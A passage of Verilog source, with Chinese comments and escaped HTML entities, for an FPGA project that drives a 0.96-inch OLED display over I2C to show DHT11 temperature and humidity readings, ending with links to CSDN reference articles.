+ show_y + font_row&#125;; &#x27;d1: showfont_data_reg &lt;= &#123;8&#x27;h78,8&#x27;h00,8&#x27;h00 + show_x[3:0]&#125;; &#x27;d2: showfont_data_reg &lt;= &#123;8&#x27;h78,8&#x27;h00,8&#x27;h10 + show_x[7:4]&#125;; default:\tshowfont_data_reg &lt;= &#123;8&#x27;h78,8&#x27;h40,fontdata&#125;; //fontdata endcase end always@(posedge sys_clk or negedge rst_n) begin if(rst_n == 1&#x27;b0) font_index &lt;= &#x27;d0; else if(write_done == 1&#x27;b1 &amp;&amp; font_index == &#x27;d10) font_index &lt;= &#x27;d0; else if(write_done == 1&#x27;b1 &amp;&amp; ShowData_req == 1&#x27;b1) font_index &lt;= font_index + 1&#x27;b1; else font_index &lt;= font_index; end always@(posedge sys_clk or negedge rst_n) begin if(rst_n == 1&#x27;b0) font_row &lt;= 1&#x27;b0; else if(onefont_finish == 1&#x27;b1) font_row &lt;= 1&#x27;b0; else if(write_done == 1&#x27;b1 &amp;&amp; font_index == &#x27;d10) font_row &lt;= 1&#x27;b1; else font_row &lt;= font_row; end always@(posedge sys_clk or negedge rst_n) begin if(rst_n == 1&#x27;b0) font_sel &lt;= &#x27;d0; else if(ShowData_finish == 1&#x27;b1) font_sel &lt;= &#x27;d0; else if(onefont_finish == 1&#x27;b1) font_sel &lt;= font_sel + 1&#x27;b1; else font_sel &lt;= font_sel; end always@(posedge sys_clk or negedge rst_n) begin if(rst_n == 1&#x27;b0) begin show_x &lt;= &#x27;d0; show_y &lt;= &#x27;d0; end else if(font_sel == &#x27;d0) begin show_x &lt;= &#x27;d54; show_y &lt;= &#x27;d3; end else if(font_sel == &#x27;d1) begin show_x &lt;= &#x27;d62; show_y &lt;= &#x27;d3; end else if(font_sel == &#x27;d2) begin show_x &lt;= &#x27;d79; show_y &lt;= &#x27;d3; end else if(font_sel == &#x27;d3) begin show_x &lt;= &#x27;d88; show_y &lt;= &#x27;d3; end else if(font_sel == &#x27;d4) begin show_x &lt;= &#x27;d54; show_y &lt;= &#x27;d5; end else if(font_sel == &#x27;d5) begin show_x &lt;= &#x27;d62; show_y &lt;= &#x27;d5; end else if(font_sel == &#x27;d6) begin show_x &lt;= &#x27;d79; show_y &lt;= &#x27;d5; end else if(font_sel == &#x27;d7) begin show_x &lt;= &#x27;d88; show_y &lt;= &#x27;d5; end else begin show_x &lt;= &#x27;d0; show_y &lt;= &#x27;d0; end end always@(posedge sys_clk or negedge rst_n) begin if(rst_n == 1&#x27;b0) font &lt;= &#x27;d0; else if(font_sel == &#x27;d0) font &lt;= tempHREG / 10; else if(font_sel == &#x27;d1) font &lt;= tempHREG % 10; else if(font_sel == &#x27;d2) font &lt;= tempLREG / 10; else if(font_sel == &#x27;d3) font &lt;= tempLREG % 10; else if(font_sel == &#x27;d4) font &lt;= humidityHREG / 10; else if(font_sel == &#x27;d5) font &lt;= humidityHREG % 10; else if(font_sel == &#x27;d6) font &lt;= humidityLREG / 10; else if(font_sel == &#x27;d7) font &lt;= humidityLREG % 10; else font &lt;= font; end always@(posedge sys_clk or negedge rst_n) begin if(rst_n == 1&#x27;b0) tempHREG &lt;= &#x27;d0; else if(dht11_done == 1&#x27;b1) tempHREG &lt;= tempH; else tempHREG &lt;= tempHREG; end always@(posedge sys_clk or negedge rst_n) begin if(rst_n == 1&#x27;b0) tempLREG &lt;= &#x27;d0; else if(dht11_done == 1&#x27;b1) tempLREG &lt;= tempL; else tempLREG &lt;= tempLREG; end always@(posedge sys_clk or negedge rst_n) begin if(rst_n == 1&#x27;b0) humidityHREG &lt;= &#x27;d0; else if(dht11_done == 1&#x27;b1) humidityHREG &lt;= humidityH; else humidityHREG &lt;= humidityHREG; end always@(posedge sys_clk or negedge rst_n) begin if(rst_n == 1&#x27;b0) humidityLREG &lt;= &#x27;d0; else if(dht11_done == 1&#x27;b1) humidityLREG &lt;= humidityL; else humidityLREG &lt;= humidityLREG; end OLED_NumData OLED_NumDataHP( .sys_clk (sys_clk), .rst_n (rst_n), .font_row\t(font_row), .font_sel\t(font), .index (font_index - &#x27;d3), .data (fontdata) ); endmodule OLED_ShowFont.v module OLED_ShowFont( input sys_clk, input rst_n, input ShowFont_req, //字符显示请求 input write_done, //iic一组数据写完成 output[23:0]\tShowFont_Data, //字符显示数据 output ShowFont_finish //字符显示完成 ); reg[8:0] showfont_index; reg[23:0] showfont_data_reg; wire[7:0] fontdata; reg[5:0] font_index; //当前显示第几个字符 reg[1:0] font_size; //1 :16*16 0 : 8*16 reg[7:0] show_x; reg[3:0] show_y; reg font_row; wire onefont_finish; assign onefont_finish = ((showfont_index == (&#x27;d10 + &#x27;d8 * font_size)) &amp;&amp; (font_row == 1&#x27;b1) &amp;&amp; write_done == 1&#x27;b1) ? 1&#x27;b1 : 1&#x27;b0; assign ShowFont_finish = (onefont_finish == 1&#x27;b1 &amp;&amp; font_index == &#x27;d14) ? 1&#x27;b1 : 1&#x27;b0; assign ShowFont_Data = showfont_data_reg; always@(posedge sys_clk or negedge rst_n) begin if(rst_n == 1&#x27;b0) showfont_index &lt;= &#x27;d0; else if(onefont_finish == 1&#x27;b1) showfont_index &lt;= &#x27;d0; else if(font_size == &#x27;d0 &amp;&amp; showfont_index == &#x27;d10 &amp;&amp; write_done == 1&#x27;b1) showfont_index &lt;= &#x27;d0; else if(font_size == &#x27;d1 &amp;&amp; showfont_index == &#x27;d18 &amp;&amp; write_done == 1&#x27;b1) showfont_index &lt;= &#x27;d0; else if(write_done == 1&#x27;b1 &amp;&amp; ShowFont_req == 1&#x27;b1) showfont_index &lt;= showfont_index + 1&#x27;b1; else showfont_index &lt;= showfont_index; end always@(*) begin case(showfont_index) &#x27;d0:\tshowfont_data_reg &lt;= &#123;8&#x27;h78,8&#x27;h00,8&#x27;hB0 + show_y + font_row&#125;; &#x27;d1: showfont_data_reg &lt;= &#123;8&#x27;h78,8&#x27;h00,8&#x27;h00 + show_x[3:0]&#125;; &#x27;d2: showfont_data_reg &lt;= &#123;8&#x27;h78,8&#x27;h00,8&#x27;h10 + show_x[7:4]&#125;; default:\tshowfont_data_reg &lt;= &#123;8&#x27;h78,8&#x27;h40,fontdata&#125;; //fontdata endcase end always@(posedge sys_clk or negedge rst_n) begin if(rst_n == 1&#x27;b0) font_row &lt;= 1&#x27;b0; else if(onefont_finish == 1&#x27;b1) font_row &lt;= 1&#x27;b0; else if(font_size == &#x27;d0 &amp;&amp; showfont_index == &#x27;d10 &amp;&amp; write_done == 1&#x27;b1) font_row &lt;= 1&#x27;b1; else if(font_size == &#x27;d1 &amp;&amp; showfont_index == &#x27;d18 &amp;&amp; write_done == 1&#x27;b1) font_row &lt;= 1&#x27;b1; else font_row &lt;= font_row; end always@(posedge sys_clk or negedge rst_n) begin if(rst_n == 1&#x27;b0) font_size &lt;= &#x27;d0; else if(font_index &lt;= &#x27;d3) font_size &lt;= &#x27;d0; else if(font_index == &#x27;d10 || font_index == &#x27;d12 || font_index == &#x27;d13 || font_index == &#x27;d14) font_size &lt;= &#x27;d0; else font_size &lt;= &#x27;d1; end always@(posedge sys_clk or negedge rst_n) begin if(rst_n == 1&#x27;b0) font_index &lt;= &#x27;d0; else if(ShowFont_finish == 1&#x27;b1) font_index &lt;= &#x27;d0; else if(onefont_finish == 1&#x27;b1) font_index &lt;= font_index + 1&#x27;b1; else font_index &lt;= font_index; end always@(posedge sys_clk or negedge rst_n) begin if(rst_n == 1&#x27;b0) //F begin show_x &lt;= &#x27;d8; show_y &lt;= &#x27;d0; end else if(onefont_finish == 1&#x27;b1 &amp;&amp; font_index == &#x27;d0) //P begin show_x &lt;= &#x27;d24; show_y &lt;= &#x27;d0; end else if(onefont_finish == 1&#x27;b1 &amp;&amp; font_index == &#x27;d1) //G begin show_x &lt;= &#x27;d40; show_y &lt;= &#x27;d0; end else if(onefont_finish == 1&#x27;b1 &amp;&amp; font_index == &#x27;d2) //A begin show_x &lt;= &#x27;d56; show_y &lt;= &#x27;d0; end else if(onefont_finish == 1&#x27;b1 &amp;&amp; font_index == &#x27;d3) //之 begin show_x &lt;= &#x27;d77; show_y &lt;= &#x27;d0; end else if(onefont_finish == 1&#x27;b1 &amp;&amp; font_index == &#x27;d4) //旅 begin show_x &lt;= &#x27;d100; show_y &lt;= &#x27;d0; end else if(onefont_finish == 1&#x27;b1 &amp;&amp; font_index == &#x27;d5)\t//温 begin show_x &lt;= &#x27;d10; show_y &lt;= &#x27;d3; end else if(onefont_finish == 1&#x27;b1 &amp;&amp; font_index == &#x27;d6) //度 begin show_x &lt;= &#x27;d30; show_y &lt;= &#x27;d3; end else if(onefont_finish == 1&#x27;b1 &amp;&amp; font_index == &#x27;d7)\t//湿 begin show_x &lt;= &#x27;d10; show_y &lt;= &#x27;d5; end else if(onefont_finish == 1&#x27;b1 &amp;&amp; font_index == &#x27;d8) //度 begin show_x &lt;= &#x27;d30; show_y &lt;= &#x27;d5; end else if(onefont_finish == 1&#x27;b1 &amp;&amp; font_index == &#x27;d9) //. begin show_x &lt;= &#x27;d70; show_y &lt;= &#x27;d3; end else if(onefont_finish == 1&#x27;b1 &amp;&amp; font_index == &#x27;d10) //℃ begin show_x &lt;= &#x27;d100; show_y &lt;= &#x27;d3; end else if(onefont_finish == 1&#x27;b1 &amp;&amp; font_index == &#x27;d11) //R begin show_x &lt;= &#x27;d100; show_y &lt;= &#x27;d5; end else if(onefont_finish == 1&#x27;b1 &amp;&amp; font_index == &#x27;d12) //H begin show_x &lt;= &#x27;d108; show_y &lt;= &#x27;d5; end else if(onefont_finish == 1&#x27;b1 &amp;&amp; font_index == &#x27;d13) //. begin show_x &lt;= &#x27;d70; show_y &lt;= &#x27;d5; end else begin show_x &lt;= show_x; show_y &lt;= show_y; end end OLED_FontData OLED_FontData_HP( .sys_clk (sys_clk), .rst_n (rst_n), .font_row (font_row), .font_sel (font_index), .index (showfont_index - &#x27;d3), .data (fontdata) ); endmodule OLED_Top.v //OLED顶层模块 module OLED_Top( input sys_clk, input rst_n, //DHT11数值显示 input dht11_done, input[7:0] tempH, input[7:0] tempL, input[7:0] humidityH, input[7:0] humidityL, //OLED IIC output OLED_SCL, inout OLED_SDA ); localparam OLED_INIT = &#x27;d0; //初始化 localparam OLED_Refresh\t= &#x27;d1; //刷新，将oled全部写0 localparam OLED_ShowFont =\t&#x27;d2; //显示字符 localparam OLED_IDLE = &#x27;d3; //空闲 localparam OLED_ShowData\t=\t&#x27;d4; //显示数据 reg[4:0] state , next_state; //IIC相关信号 wire IICWriteReq; wire[23:0] IICWriteData; wire IICWriteDone; //初始化相关信号 wire init_finish; wire[23:0] Init_data; wire init_req; //refresh相关信号 wire refresh_finish; wire[23:0] refresh_data; wire refresh_req; //字符显示相关信号 wire showfont_finish; wire[23:0] showfont_data; wire showfont_req; //显示数据相关信号 wire showdata_finish; wire[23:0] showdata_data; wire showdata_req; assign init_req = (state == OLED_INIT) ? 1&#x27;b1 : 1&#x27;b0; assign refresh_req = (state == OLED_Refresh) ? 1&#x27;b1 : 1&#x27;b0; assign showfont_req = (state == OLED_ShowFont) ? 1&#x27;b1 : 1&#x27;b0; assign showdata_req = (state == OLED_ShowData) ? 1&#x27;b1 : 1&#x27;b0; always@(posedge sys_clk or negedge rst_n) begin if(rst_n == 1&#x27;b0) state &lt;= OLED_INIT; else state &lt;= next_state; end always@(*) begin case(state) OLED_INIT: if(init_finish == 1&#x27;b1) next_state &lt;= OLED_Refresh; else next_state &lt;= OLED_INIT; OLED_Refresh: if(refresh_finish == 1&#x27;b1) next_state &lt;= OLED_ShowFont; else next_state &lt;= OLED_Refresh; OLED_ShowFont: if(showfont_finish == 1&#x27;b1) next_state &lt;= OLED_IDLE; else next_state &lt;= OLED_ShowFont; OLED_IDLE: if(dht11_done == 1&#x27;b1) next_state &lt;= OLED_ShowData; else next_state &lt;= OLED_IDLE; OLED_ShowData: if(showdata_finish == 1&#x27;b1) next_state &lt;= OLED_IDLE; else next_state &lt;= OLED_ShowData; default: next_state &lt;= OLED_INIT; endcase end OLED_Init OLED_InitHP( .sys_clk (sys_clk), .rst_n (rst_n), .init_req (init_req), //初始化请求 .write_done (IICWriteDone), //一组初始化数据完成信号 .init_finish (init_finish), //初始化完成输出 .Init_data (Init_data)//初始化的数据 ); OLED_Refresh( .sys_clk (sys_clk), .rst_n (rst_n), .refresh_req (refresh_req), //初始化请求 .write_done (IICWriteDone), //一组初始化数据完成信号 .refresh_finish\t(refresh_finish), //初始化完成输出 .refresh_data (refresh_data)\t//初始化的数据 ); OLED_ShowFont OLED_ShowFont_HP( .sys_clk (sys_clk), .rst_n (rst_n), .ShowFont_req\t(showfont_req), //字符显示请求 .write_done (IICWriteDone), //iic一组数据写完成 .ShowFont_Data (showfont_data), //字符显示数据 .ShowFont_finish(showfont_finish) //字符显示完成 ); OLED_ShowData OLED_ShowDataHP( .sys_clk (sys_clk), .rst_n (rst_n), .dht11_done (dht11_done), .tempH (tempH), //温度数据整数 .tempL (tempL), //温度数据小数 .humidityH (humidityH), //温度数据整数 .humidityL (humidityL), //温度数据小数 .ShowData_req\t(showdata_req), //字符显示请求 .write_done (IICWriteDone), //iic一组数据写完成 .ShowData_Data\t(showdata_data), //字符显示数据 .ShowData_finish\t(showdata_finish) //字符显示完成 ); //数据选择 OLED_SelData OLED_SelDataHP( .sys_clk (sys_clk), .rst_n (rst_n), .init_req (init_req), .init_data (Init_data), .refresh_req\t(refresh_req), .refresh_data\t(refresh_data), .showfont_req\t(showfont_req), .showfont_data\t(showfont_data), .showdata_req\t(showdata_req), .showdata_data\t(showdata_data), .IICWriteReq\t(IICWriteReq), .IICWriteData\t(IICWriteData) ); IIC_Driver IIC_DriverHP_OLED( .sys_clk (sys_clk), /*系统时钟*/ .rst_n (rst_n), /*系统复位*/ .IICSCL (OLED_SCL), /*IIC 时钟输出*/ .IICSDA (OLED_SDA), /*IIC 数据线*/ .IICSlave (&#123;IICWriteData[15:8],IICWriteData[23:16]&#125;), /*从机 8bit的寄存器地址 + 8bit的从机地址*/ .IICWriteReq (IICWriteReq), /*IIC写寄存器请求*/ .IICWriteDone (IICWriteDone), /*IIC写寄存器完成*/ .IICWriteData (IICWriteData[7:0]), /*IIC发送数据 8bit的数据*/ .IICReadReq (1&#x27;b0), /*IIC读寄存器请求*/ .IICReadDone (), /*IIC读寄存器完成*/ .IICReadData () /*IIC读取数据*/ ); endmodule 参考链接[1] STM32 7针0.96寸OLED显示屏（硬件SPI+DMA）无需内核响应 超高刷新率！_0.96oled速率-CSDN博客 [2] 7脚spi OLED屏幕改造成IIC屏幕_7针spioled改4针iic-CSDN博客 [3] FPGA之旅设计99例之第九例—–驱动0.96寸OLED屏_fpga oled 12864-CSDN博客"}]